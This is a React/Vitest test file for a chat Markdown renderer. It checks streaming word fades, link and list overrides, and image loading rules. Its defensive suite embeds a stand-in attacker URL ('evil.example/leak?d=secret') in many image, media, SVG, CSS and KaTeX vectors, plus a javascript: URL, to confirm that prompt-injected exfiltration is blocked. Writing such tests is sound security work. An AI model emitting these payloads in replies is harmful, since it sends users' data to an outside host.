import { act, render } from "@testing-library/react";
import { afterEach, beforeEach, expect, it, vi } from "vitest";
import { Markdown, MarkdownLinksProvider } from "./markdown";

beforeEach(() => {
  vi.useFakeTimers({ toFake: ["requestAnimationFrame", "cancelAnimationFrame", "performance"] });
});
afterEach(() => vi.useRealTimers());

const text = "Lighthouses were never meant to be beautiful. They were built to warn ships off coastlines that had sunk too many of them.";

it("keeps the word elements already shown while more text streams in, so their fade is not restarted", () => {
  const { container, rerender } = render(<Markdown streaming>{text.slice(0, 20)}</Markdown>);
  act(() => vi.advanceTimersByTime(500));
  const first = container.querySelector(".chat-word");
  expect(first?.textContent).toBe("Lighthouses");

  rerender(<Markdown streaming>{text.slice(0, 70)}</Markdown>);
  act(() => vi.advanceTimersByTime(500));
  rerender(<Markdown streaming={false}>{text}</Markdown>);
  act(() => vi.advanceTimersByTime(1000));

  expect(container.querySelector(".chat-word")).toBe(first);
  expect(container.querySelectorAll(".chat-word").length).toBe(text.split(/\s+/).length);
  expect(container.querySelector(".chat-markdown")?.className).toContain("chat-fade");
});

it("renders history without word spans", () => {
  const { container } = render(<Markdown>{text}</Markdown>);
  expect(container.querySelector(".chat-word")).toBeNull();
  expect(container.textContent).toBe(text);
});

it("lets the host draw some links its own way", () => {
  const { container } = render(
    <MarkdownLinksProvider renderLink={({ href }) => (href.includes("/jobs/") ? <span data-job={href}>job row</span> : undefined)}>
      <Markdown>{"See [Engineer](https://jobs.example/jobs/7) and [docs](https://example.com)."}</Markdown>
    </MarkdownLinksProvider>,
  );
  expect(container.querySelector("[data-job]")?.textContent).toBe("job row");
  expect(container.querySelector("a")?.getAttribute("href")).toBe("https://example.com/");
});

const jobs = "Matches:\n\n- [Engineer](https://jobs.example/jobs/7)\n- [Designer](https://jobs.example/jobs/9)\n";

it("lets the host replace a list whose items are all links, keeping the inline markup", () => {
  const { container } = render(
    <MarkdownLinksProvider
      renderLinkList={({ links }) => (
        <div data-cards>
          {links.map((l) => (
            <section key={l.href} data-card={l.href}>{l.children}</section>
          ))}
        </div>
      )}
    >
      <Markdown>{jobs.replace("Engineer", "**Engineer**")}</Markdown>
    </MarkdownLinksProvider>,
  );
  expect([...container.querySelectorAll("[data-card]")].map((n) => n.getAttribute("data-card"))).toEqual(["https://jobs.example/jobs/7", "https://jobs.example/jobs/9"]);
  expect(container.querySelector("[data-card] :is(strong, [data-streamdown='strong'])")?.textContent).toBe("Engineer");
  expect(container.querySelector("ul")).toBeNull();
});

it("keeps a list that has anything but links, and handles loose lists", () => {
  const render_ = (md: string) =>
    render(
      <MarkdownLinksProvider renderLinkList={() => <div data-cards />}>
        <Markdown>{md}</Markdown>
      </MarkdownLinksProvider>,
    ).container;
  const mixed = render_("- [Engineer](https://jobs.example/jobs/7)\n- plain item\n");
  expect(mixed.querySelector("[data-cards]")).toBeNull();
  expect(mixed.querySelectorAll("li")).toHaveLength(2);
  expect(render_("- [A](https://a.example)\n\n- [B](https://b.example)\n").querySelector("[data-cards]")).not.toBeNull();
  expect(render_("1. [A](https://a.example)\n2. [B](https://b.example)\n").querySelector("[data-cards]")).not.toBeNull();
});

// Images in replies: nothing remote may load on render (prompt-injected exfiltration).
const REMOTE = "https://evil.example/leak?d=secret";
const vectors: Record<string, string> = {
  "inline image": `![](${REMOTE})`,
  "inline image with alt": `![chart](${REMOTE})`,
  "reference-style image": `![chart][r]\n\n[r]: ${REMOTE}`,
  "raw html img": `<img src="${REMOTE}" alt="x">`,
  "raw html img with srcset": `<img src="x.png" srcset="${REMOTE} 2x">`,
  "picture with source": `<picture><source srcset="${REMOTE}"><img src="${REMOTE}"></picture>`,
  "protocol-relative image": `![](//evil.example/leak?d=secret)`,
  "video, audio, iframe, embed, object": [
    `<video src="${REMOTE}" poster="${REMOTE}"></video>`,
    `<audio src="${REMOTE}"></audio>`,
    `<iframe src="${REMOTE}"></iframe>`,
    `<embed src="${REMOTE}">`,
    `<object data="${REMOTE}"></object>`,
  ].join("\n\n"),
  "svg image": `<svg><image href="${REMOTE}"/></svg>`,
  "css background": `<div style="background:url(${REMOTE})">x</div>`,
  "autolinked image url": `${REMOTE}.png`,
  "katex includegraphics": `$\\includegraphics{${REMOTE}}$`,
};

for (const [name, source] of Object.entries(vectors)) {
  it(`loads nothing remote for a ${name}`, () => {
    const { container } = render(<Markdown>{source}</Markdown>);
    const loading = [...container.querySelectorAll("*")].filter((el) => {
      if (el.tagName === "A") return false;
      const attrs = ["src", "srcset", "data", "poster", "href", "style"].map((a) => el.getAttribute(a) ?? "");
      return attrs.some((v) => /evil\.example/.test(v));
    });
    expect(loading.map((el) => el.outerHTML)).toEqual([]);
    expect(container.querySelector("img, source, video, audio, iframe, embed, object, image")).toBeNull();
  });
}

it("shows a blocked image as a link that is only opened by the reader", () => {
  const { container } = render(<Markdown>{`![](${REMOTE})`}</Markdown>);
  const a = container.querySelector("a");
  expect(a?.textContent).toBe("evil.example");
  expect(a?.getAttribute("href")).toBe(REMOTE);
  expect(a?.getAttribute("rel")).toBe("noopener noreferrer");
  const withAlt = render(<Markdown>{`![a chart](${REMOTE})`}</Markdown>);
  expect(withAlt.container.querySelector("a")?.textContent).toBe("a chart");
});

it("does not link a blocked image whose scheme is not http(s)", () => {
  const { container } = render(<Markdown>{`![fake](javascript:alert(1))`}</Markdown>);
  expect(container.querySelector("a, img")).toBeNull();
});

it("loads data:image URLs without config", () => {
  const { container } = render(<Markdown>{`![dot](data:image/png;base64,iVBORw0KGgo=)`}</Markdown>);
  expect(container.querySelector("img")?.getAttribute("src")).toMatch(/^data:image\/png/);
});

it("loads images only from imageOrigins", () => {
  const md = `![a](https://cdn.example.com/a.png)\n\n![b](${REMOTE})\n\n![c](//evil.example/c.png)`;
  const { container } = render(
    <MarkdownLinksProvider imageOrigins={["https://cdn.example.com"]}><Markdown>{md}</Markdown></MarkdownLinksProvider>,
  );
  const imgs = [...container.querySelectorAll("img")].map((i) => i.getAttribute("src"));
  expect(imgs).toEqual(["https://cdn.example.com/a.png"]);
  // The URL that names another origin shows as a link; the protocol-relative one is dropped by the sanitizer.
  expect(container.querySelectorAll("a").length).toBe(1);
});

it("loads any http(s) image with imageOrigins all", () => {
  const { container } = render(<MarkdownLinksProvider imageOrigins="all"><Markdown>{`![](${REMOTE})`}</Markdown></MarkdownLinksProvider>);
  expect(container.querySelector("img")?.getAttribute("src")).toBe(REMOTE);
});

it("lets renderImage draw every image, including raw html ones", () => {
  const { container } = render(
    <MarkdownLinksProvider renderImage={({ src, alt }) => <b data-src={src}>{alt}</b>}>
      <Markdown>{`![one](${REMOTE})\n\n<img src="${REMOTE}2" alt="two">`}</Markdown>
    </MarkdownLinksProvider>,
  );
  expect([...container.querySelectorAll("b")].map((b) => b.textContent)).toEqual(["one", "two"]);
  expect(container.querySelector("img")).toBeNull();
});
